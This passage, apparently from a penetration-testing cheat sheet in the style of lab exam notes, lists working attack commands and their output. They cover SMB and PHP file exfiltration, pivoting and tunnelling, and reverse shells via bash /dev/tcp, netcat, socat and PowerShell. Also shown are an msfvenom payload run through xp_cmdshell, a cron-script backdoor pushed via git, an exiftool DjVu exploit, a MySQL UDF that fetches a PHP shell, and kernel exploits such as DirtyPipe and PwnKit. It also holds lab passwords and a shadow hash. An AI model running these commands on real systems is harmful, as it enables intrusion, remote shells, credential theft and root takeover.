Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.93.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
   
 Via Computer A we pivot to Computer B (internal IP) with these creds
 proxychains evil-winrm -u celia.almeda -p 7k8XHk3dMtmpnC7 -i 10.10.93.142
````
#### Accessing $C Drive of Computer A
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Admin password123
````
#### Copying over files
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SYSTEM Z:\
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SAM Z:\
````
### SMB Server Bi-directional
````
impacket-smbserver -smb2support Share .
smbserver.py -smb2support Share .
mkdir loot #transfering loot to this folder
net use * \\192.168.119.183\share
copy Z:\<file you want from kali>
copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
````
#### Authenticated
````
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
````
````
impacket-smbserver -username df -password df share . -smb2support
net use \\10.10.16.9\share /u:df df
copy \\10.10.16.9\share\<file wanted>
````

### PHP Script Windows to Linux
````
cat upload.php
chmod +x upload.php
````
````
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
````
````
sudo mkdir /var/www/uploads
````
````
mv upload.php /var/www/uploads
````
````
service apache2 start
ps -ef | grep apache
`````
````
powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
````
````
service apache2 stop
````

## Linux System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/546/546049.png" width="40" height="40" />
### Use this guide first
````
https://sirensecurity.io/blog/linux-privilege-escalation-resources/
````
### Checking interesting folders
````
/opt #lead us to chloe which lead us to root
````
### Finding Writable Directories
````
find / -type d -writable -user $(whoami) 2>/dev/null
````
### Finding SUID Binaries
````
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
find / -perm /4000 2>/dev/null
````
### start-stop-daemon
````
/usr/sbin/start-stop-daemon
````
````
/usr/sbin/start-stop-daemon -n foo -S -x /bin/sh -- -p
````
### Crontab 
````
cat /etc/crontab
````
### NFS
````
cat /etc/exports
````
## Windows System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/232/232411.png" width="40" height="40" />
### PowerUp.ps1
````
cp /opt/PowerUp/PowerUp.ps1 .
Import-Module .\PowerUp.ps1
. .\PowerUp.ps1
````
### Windows Binaries
````
sudo apt install windows-binaries
````
### Basic Enumeration of the System
````
# Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn
````
````
dir /a-r-d /s /b
move "C:\Inetpub\wwwroot\winPEASx86.exe" "C:\Directory\thatisWritable\winPEASx86.exe"
````
#### Windows Services - insecure file persmissions
````
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command refer to exploits below
````
### Clear text passwords
````
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
````
````
dir /s /p proof.txt
dir /s /p local.txt
````
### Git commands
````
C:\Users\damon> type .gitconfig
[safe]
        directory = C:/prod
[user]
        email = damian
        name = damian
````
````
C:\Users\damon> cd C:/prod
````
````
C:\prod> git log
fatal: detected dubious ownership in repository at 'C:/prod'
'C:/prod/.git' is owned by:
        'S-1-5-21-464543310-226837244-3834982083-1003'
but the current user is:
        'S-1-5-18'
To add an exception for this directory, call:

        git config --global --add safe.directory C:/prod
````
````
C:\prod> git config --global --add safe.directory C:/prod
````
````
C:\prod> git log
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

commit 967fa71c359fffcbeb7e2b72b27a321612e3ad11
Author: damian <damian>
Date:   Thu Oct 20 02:06:37 2022 -0700

    V1
````
````
C:\prod> git show
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@example.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@example.com as he is responsible for the mail server. 
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file
````
### Powershell password hunting
#### Viewing Powershell History
````
PS C:\> (Get-PSReadlineOption).HistorySavePath
C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
````
#### Interesting Files
````
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
type C:\xampp\passwords.txt

Get-ChildItem -Path C:\Users\USERD\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
cat Desktop\asdf.txt
````
## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
### Linux
#### Pimp my shell
````
which python
which python2
which python3
python -c ‘import pty; pty.spawn(“/bin/bash”)’
````
````
which socat
socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
````
````
Command 'ls' is available in '/bin/ls'
export PATH=$PATH:/bin
````
````
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
export PATH=$PATH:/usr/bin
````
````
-rbash: $'\r': command not found
BASH_CMDS[a]=/bin/sh;a
````
````
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
````
#### Reverse shells
````
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
````
````
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 #worked
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' #worked
````
### Windows
#### Stable shell
````
nc -nlvp 9001
.\nc.exe <your kali IP> 9001 -e cmd
C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe
````
#### Powershell
````
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444" >> Invoke-PowerShellTcp.ps1
powershell -executionpolicy bypass -file Invoke-PowerShellTcp.ps1 #Once on victim run this
````
## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
````
https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/pivoting-basics/
````
### Commands
````
ps aux | grep ssh
kill (enter pid #)
````
### Tools
#### sshuttle
##### Linux Enviorment
````
sshuttle -r USERS@10.11.1.251 10.1.1.0/24 #run on your kali machine to proxy traffic into the IT Network
#In this situation we have rooted a linux machine got user creds and can establish an sshuttle
#You can visit the next network as normal and enumerate it as normal.
#best used for everything else but nmap
````
###### Transfering files via sshuttle
````
sshuttle -r USERS@10.11.1.251 10.1.1.0/24 #1 Port Foward to our machine
python3 -m http.server 800 # on our kali machine
ssh userc@10.1.1.27 curl http://192.168.119.140:800/linpeas.sh -o /tmp/linpeas.sh #2 on our kali machine to dowload files
````
#### ssh port foward
##### Linux Enviorment
````
sudo echo "socks4 127.0.0.1 80" >> /etc/proxychains.conf 
[7:06 PM]
ssh -NfD 80 USERS@10.11.1.251 10.1.1.0/24
[7:07 PM]
proxychains nmap -p- --min-rate=1000 10.1.1.27 -Pn #best used for nmap only
proxychains nmap -sT --top-ports 1000 --min-rate=1000 -Pn  10.1.1.68 -v # better scan
proxychains nmap -A -sT -p445 -Pn 10.1.1.68 # direct scans of ports this is best used when enumerating each port
````
#### ssh Local port fowarding
##### Info 
````
In local port forwarding, you are forwarding a port on your local machine to a remote machine. This means that when you connect to a remote server using SSH and set up local port forwarding, any traffic sent to the specified local port will be forwarded over the SSH connection to the remote machine and then forwarded to the target service or application.
````
##### Example
````
ssh -L 6070:127.0.0.1:2049 userc@10.1.1.27 -N
````
````
This command creates an SSH tunnel between your local computer and a remote computer at IP address 10.1.1.27, with the user "userc". The tunnel forwards all traffic sent to port 6070 on your local computer to port 2049 on the remote computer, which is only accessible via localhost (127.0.0.1). The "-N" flag tells SSH to not execute any commands after establishing the connection, so it will just stay open and forward traffic until you manually terminate it. This is commonly used for securely accessing network services that are not directly accessible outside of a certain network or firewall.

#notes we did not use proxychains on this. just as the setup was above
````
##### Example #2
````
Lets say you have compromised host 192.168.236.147 which has access to 10.10.126.148, you could access the mssql server on port 1433 locally by doing a local port forward as seen below. This will essence allow you to access to the mssql port on your local machine with out needing proxychains.
````
````
ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
````
````
sqsh -S 127.0.0.1 -U example.com\\sql_service -P password123 -D msdb
````
#### Bi-directional ssh tunnel
````
In this example we are 192.168.45.191 attacking an AD exploit chain with internal/private IPs. We are able to get sql_service creds on MS01 which can be used to login into MS02, once we login we cannot download any files or do any rce's so we have to setup a bi-directional ssh tunnel.
````
##### arp -a
````
 sudo impacket-psexec Admin:password123@192.168.236.147 cmd.exe
````
````
We are using the arp -a on MS01 to show where we got some of the IPs, internal and external facing when going through this exploit chain.
````
````
C:\Windows\system32> arp -a
 
Interface: 192.168.236.147 --- 0x6
  Internet Address      Physical Address      Type   
  192.168.236.254       00-50-56-bf-dd-5e     dynamic   
  192.168.236.255       ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static    

Interface: 10.10.126.147 --- 0x8
  Internet Address      Physical Address      Type
  10.10.126.146         00-50-56-bf-27-a8     dynamic
  10.10.126.148         00-50-56-bf-f9-55     dynamic
  10.10.126.255         ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static
````
##### Local Port Foward
````
Sets up local port forwarding. It instructs SSH to listen on port 1433 on the local machine and forward any incoming traffic to the destination IP address 10.10.126.148 on port 1433. Admin@192.168.236.147: Specifies the username (Admin) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
````
````
ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
````
````
In our next command we are able to login as the sql_service on 10.10.126.148 (MS02) as if we were 192.168.236.147 (MS01)
````
````
sqsh -S 127.0.0.1 -U example.com\\sql_service -P password123 -D msdb
````
##### Reverse Port Foward
````
-R 10.10.126.147:7781:192.168.45.191:18890: Sets up reverse port forwarding. It instructs SSH to listen on IP 10.10.126.147 and port 7781 on the remote server, and any incoming traffic received on this port should be forwarded to the IP 192.168.45.191 and port 18890.
Admin@192.168.236.147: Specifies the username (Admin) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
````
````
sudo ssh -R 10.10.126.147:7781:192.168.45.191:18890 Admin@192.168.236.147 -N
````
##### RCE
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.126.147 LPORT=7781 EXITFUNC=thread -f exe --platform windows -o rshell.exe
````
````
1> xp_cmdshell 'whoami'
nt service\mssql$sqlexpress
````
````
1> xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
````
````
python3 -m http.server 18890
Serving HTTP on 0.0.0.0 port 18890 (http://0.0.0.0:18890/) ...
192.168.45.191 - - [30/May/2023 22:05:32] "GET /rshell.exe HTTP/1.1" 200 -
````
````
1> xp_cmdshell 'c:\Users\Public\reverse.exe"'
````
````
nc -nlvp 18890
retrying local 0.0.0.0:18890 : Address already in use
retrying local 0.0.0.0:18890 : Address already in use
listening on [any] 18890 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.45.191] 37446
Microsoft Windows [Version 10.0.19042.1586]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssql$sqlexpress
````
#### Chisel
````
https://github.com/jpillora/chisel/releases/ #where you can find newer versions
````
##### Chisel Windows
````
https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_windows_386.gz #Windows Client
cp /home/kali/Downloads/chisel_1.8.1_windows_386.gz .
gunzip -d *.gz
chmod +x chisel_1.8.1_windows_386
mv chisel_1.8.1_windows_386 chisel.exe
````
##### Chisel Nix
````
locate chisel
/usr/bin/chisel #Linux Server
````
###### Windows to Nix
````
chisel server --port 8000 --socks5 --reverse #On your kali machine
vim /etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 8080
socks5 127.0.0.1 1080
certutil -urlcache -split -f http://<your $IP>:<Your Porty>/chisel.exe
.\chisel client <your IP>:8000 R:socks #On victim machine
proxychains psexec.py victim:password@<victim $IP> cmd.exe
````

## Compiling Exploit Codes <img src="https://cdn-icons-png.flaticon.com/128/868/868786.png" width="40" height="40" />
### Old exploits .c
````
sudo apt-get install gcc-multilib
sudo apt-get install libx11-dev:i386 libx11-dev
gcc 624.c -m32 -o exploit
````
## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
### Crontab/Git
In this priv esc scenario we logged in via ssg, found that a cron job was running bash file with root privs. We could git clone that same repo with the private key we find in user gits ssh folder and edit the bash file to give us a rce as root.
````
/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Jan 23 10:34 cron.daily
-rw------- 1 root root    9 May 28 02:19 cron.monthly
-rw------- 1 root root    9 May 28 02:19 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
````
````
-rwxr-xr-x 1 root root 2590 Nov  5  2020 /home/git/.ssh/id_rsa
````
#### Setup
````
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.214.125:/git-server
````
````
cd git-server
cat backups.sh 
#!/bin/bash
#
#
# # Placeholder
#

````
````
cat backups.sh 
#!/bin/bash
sh -i >& /dev/tcp/192.168.45.191/18030 0>&1
````
````
chmod +x backups.sh
````
````
GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git status            
On branch master
Your branch is up to date with 'origin/master'.

Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        modified:   backups.sh

no changes added to commit (use "git add" and/or "git commit -a")
````
#### Git setup / exploit
````
git config --global user.name "git"
git config --global user.email "git@userD" #User is the same from the private key git@
````
````
GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git add --all
IT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git commit -m "PE Commit"

[master 872aa26] Commit message
 1 file changed, 1 insertion(+), 4 deletions(-)
 
 GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git push origin master        
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 3 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 294 bytes | 147.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.214.125:/git-server
   b50f4e5..872aa26  master -> master
````
````
nc -nlvp 18030                                   
listening on [any] 18030 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.125] 48038
sh: cannot set terminal process group (15929): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.0# id
id
uid=0(root) gid=0(root) groups=0(root)
sh-5.0# 
````
### Exiftool priv esc
````
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
````
````
www-data@exfiltrated:/opt$ cat image-exif.sh
cat image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
````
#### Setup
````
sudo apt-get install -y djvulibre-bin
wget -qO sample.jpg placekitten.com/200
file sample.jpg
printf 'P1 1 1 1' > input.pbm
cjb2 input.pbm mask.djvu
djvumake exploit.djvu Sjbz=mask.djvu
echo -e '(metadata (copyright "\\\n" . `chmod +s /bin/bash` #"))' > input.txt
djvumake exploit.djvu Sjbz=mask.djvu ANTa=input.txt
exiftool '-GeoTiffAsciiParams<=exploit.djvu' sample.jpg
perl -0777 -pe 's/\x87\xb1/\xc5\x1b/g' < sample.jpg > exploit.jpg
````
#### Exploit
````
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.191:80/exploit.jpg
````
````
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
````
````
www-data@exfiltrated:/var/www/html/subrion/uploads$ /bin/bash -p
/bin/bash -p
bash-5.0# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
````
### Monitor processes/cron jobs
#### pspy
````
https://github.com/DominicBreuker/pspy
````
````
/opt/pspy/pspy64 #transfer over to victim
````
````
chmod +x pspy64
./pspy64 -pf -i 1000
````

### Active Ports
````
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp   LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*                                                                                                                                                                                
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      511        127.0.0.1:8000      0.0.0.0:*          
tcp   LISTEN 0      128             [::]:2222         [::]:*          
tcp   LISTEN 0      511                *:80              *:*          
tcp   LISTEN 0      511                *:443             *:*
````
#### Local Port Foward
````
ssh -i id_ecdsa userE@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
````
#### Curl
````
curl 127.0.0.1:8000
````
#### LFI
````
127.0.0.1:8000/backend/?view=../../../../../etc/passwd
127.0.0.1:8000/backend/?view=../../../../../var/crash/test.php&cmd=id
````
### processes
#### JDWP
````
root         852  0.0  3.9 2536668 80252 ?       Ssl  May16   0:04 java -Xdebug Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
````
````
dev@example:/opt/stats$ cat App.java
cat App.java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

class StatsApp {
    public static void main(String[] args) {
        System.out.println("System Stats\n");
        Runtime rt = Runtime.getRuntime();
        String output = new String();

        try {
            ServerSocket echod = new ServerSocket(5000);
            while (true) {
              output = "";
              output += "Available Processors: " + rt.availableProcessors() +"\r\n";
              output += "Free Memory: " + rt.freeMemory() + "\r\n";
              output += "Total Memory: " + rt.totalMemory() +"\r\n";

              Socket socket = echod.accept();
              InputStream in = socket.getInputStream();
              OutputStream out = socket.getOutputStream();
              out.write((output + "\r\n").getBytes());
              System.out.println(output);
            }
        } catch (IOException e) {
            System.err.println(e.toString());
            System.exit(1);
        }
    }
}

````

````
https://github.com/IOActive/jdwp-shellifier
````

````
proxychains python2 jdwp-shellifier.py -t 127.0.0.1
nc -nv 192.168.234.150 5000 #this port runs on the app.java, do this to trigger it
````
##### RCE
````
proxychains python2 jdwp-shellifier.py -t 127.0.0.1 --cmd "busybox nc 192.168.45.191 80 -e sh"
nc -nv 192.168.234.150 5000 #to trigger alert
nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.234.150] 59382
id
uid=0(root) gid=0(root)
````
### Kernel Expoits
#### CVE-2022-0847
````
git clone https://github.com/Al1ex/CVE-2022-0847.git
cd CVE-2022-0847
python3 -m http.server 80
````
````
wget http://192.168.45.191:80/exp
chmod +x exp
cp /etc/passwd /tmp/passwd.bak
USERZ@example:~$ ./exp /etc/passwd 1 ootz:
It worked!
USERZ@example:~$ su rootz
rootz@example:/home/USERZ# whoami
rootz
rootz@example:/home/USERZ# id
uid=0(rootz) gid=0(root) groups=0(root)
````
#### CVE-2021-3156
````
wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
chmod +x exploit_nss.py

userE@example01:~$ id
uid=1004(userE) gid=1004(userE) groups=1004(userE),998(apache)


userE@example01:~$ python3 exploit_nss.py 
# whoami
root
````
#### CVE-2022-2588
````
git clone https://github.com/Markakd/CVE-2022-2588.git
wget http://192.168.119.140/exp_file_credential
chmod +x exp_file_credential
./exp_file_credential
su user
Password: user
id
uid=0(user) gid=0(root) groups=0(root)
````
#### CVE-2016-5195
````
https://github.com/firefart/dirtycow
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
uname -a
Linux humble 3.2.0-4-486 #1 Debian 3.2.78-1 i686 GNU/Linux
gcc -pthread dirty.c -o dirty -lcrypt
gcc: error trying to exec 'cc1': execvp: No such file or directory
locate cc1
export PATH=$PATH:/usr/lib/gcc/i486-linux-gnu/4.7/cc1
./dirty
su firefart
````
#### CVE-2009-2698
````
uname -a
Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNU/Linux
bash-3.00$ id 
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ ./exp
./exp
sh-3.00# id
id
uid=0(root) gid=0(root) groups=48(apache)
````
````
https://github.com/MrG3tty/Linux-2.6.9-Kernel-Exploit
````
#### CVE-2021-4034
````
uname -a
Linux dotty 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
````
````
https://github.com/ly4k/PwnKit/blob/main/PwnKit.sh
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit #local
chmod +x PwnKit #local
./PwnKit #Victim Machine
````
#### CVE-2021-4034
````
wget https://raw.githubusercontent.com/jamesammond/CVE-2021-4034/main/CVE-2021-4034.py
````
#### [CVE-2012-0056] memodipper
````
wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/memodipper/memodipper.c
gcc memodipper.c -o memodipper #compile on the target not kali
````
### NFS Shares
#### cat /etc/exports
##### no_root_squash
````
Files created via NFS inherit the remote user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user.

Notice that the /srv share has root squashing disabled. Because of this, on our local machine we can create a mount point and mount the /srv share.

-bash-4.2$ cat /etc/exports
/srv/Share 10.1.1.0/24(insecure,rw)
/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)

"no_root_squash"
````
##### Setup
````
sshuttle -r sea@10.11.1.251 10.1.1.0/24 #setup
ssh -L 6070:127.0.0.1:2049 userc@10.1.1.27 -N #tunnel for 127.0.0.1 /srv/Share
mkdir /mnt/tmp
scp userc@10.1.1.27:/bin/bash . #copy over a reliable version of bash from the victim
chown root:root bash; chmod +s bash #change ownership and set sticky bit
ssh userc@10.1.1.27 #login to victim computer
````
##### Exploit
````
cd /srv/Share
ls -la #check for sticky bit
./bash -p #how to execute with stick bit
whoami
````
### Bad File permissions
#### cat /etc/shadow
````
root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::                                                                                                              vcsa:!!:15422:0:99999:7:::
pcap:!!:15422:0:99999:7:::
````
### MySQL Enumeration
#### Linpeas
````
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                              
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*                                                                                                                                                                       
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*    
````
````
╔══════════╣ Analyzing Backup Manager Files (limit 70)
                                                                                                                                                                                                                                           
-rw-r--r-- 1 www-data www-data 3896 Mar 31 07:56 /var/www/html/management/application/config/database.php
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
        'password' => '@jCma4s8ZM<?kA',
        'database' => 'school_mgment',

````
#### MySQL login
````
<cation/config$ mysql -u 'school' -p 'school_mgment'         
Enter password: @jCma4s8ZM<?kA
````
````
mysql> show databases;
mysql> show tables;
````
````
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| school_mgment      |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
````
````
mysql> select * from teacher\G

select * from teacher\G
*************************** 1. row ***************************
     teacher_id: 1
           name: Testing Teacher
           role: 1
 teacher_number: f82e5cc
       birthday: 2018-08-19
            sex: male
       religion: Christianity
    blood_group: B+
        address: 546787, Kertz shopping complext, Silicon Valley, United State of America, New York city.
          phone: +912345667
          email: michael_sander@school.pg
       facebook: facebook
        twitter: twitter
     googleplus: googleplus
       linkedin: linkedin
  qualification: PhD
 marital_status: Married
      file_name: profile.png
       password: 3db12170ff3e811db10a76eadd9e9986e3c1a5b7
  department_id: 2
 designation_id: 4
date_of_joining: 2019-09-15
 joining_salary: 5000
         status: 1
date_of_leaving: 2019-09-18
        bank_id: 3
   login_status: 0
1 row in set (0.00 sec)
````
### MySQL User Defined Functions
````
port 0.0.0.0:3306 open internally
users with console mysql/bin/bash
MySQL connection using root/NOPASS Yes
````
````
your $IP>wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
victim>gcc -g -c raptor_udf2.c
victim>gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
victim>mysql -u root -p
````
````
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/j0hn/script/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function | 
+-----------+-----+----------------+----------+
````
````
your $IP> cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
nc -nvlp 443
mysql> select do_system('wget http://192.168.119.184/shell.php -O /tmp/shell.php;php /tmp/shell.php');
sh-3.2# id
uid=0(root) gid=0(root)
````
### sudo -l / SUID Binaries
#### (ALL) NOPASSWD: ALL
````
sudo su -
root@example01:~# whoami
root
````
#### (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
````
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
````
#### (ALL) NOPASSWD: /usr/bin/borg [comnmand] *
````
(ALL) NOPASSWD: /usr/bin/borg list *
(ALL) NOPASSWD: /usr/bin/borg mount *
(ALL) NOPASSWD: /usr/bin/borg extract *
````
##### Writable directory
````
find -name / "*borg*"
````
````
/opt/borgbackup
````
##### finding creds to login
````
./pspy64 -pf -i 1000
````
````
BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA'
````
##### Exploitation
````
sarah@backup:/opt$ sudo /usr/bin/borg list *
````
